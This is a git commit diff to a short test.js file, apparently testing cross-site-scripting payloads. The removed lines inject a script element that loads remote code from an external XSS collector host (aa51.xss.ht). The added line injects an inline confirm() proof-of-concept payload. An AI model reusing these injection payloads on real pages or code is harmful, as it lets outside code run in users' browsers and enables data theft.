1239e338103ba73203c87da0630be69ea28b54a9
AnankeMOon <99124773+AnankeMOon@users.noreply.github.com>
2022-06-13 17:34:27 +0200

    Update test.js

--- test.js
+++ test.js
@@ -2,6 +2,4 @@ let c= "Ananke" ; d= "Moon";
 
 console.log(c + d);
 
-var a=document.createElement(\'script\');a.src=\'https://aa51.xss.ht\'; 
-          
-document.body.appendChild(a);
+var a=document.createElement('script');a.innerHTML='confirm(/this-is-an-awesome-payload/)';document.body.appendChild(a)
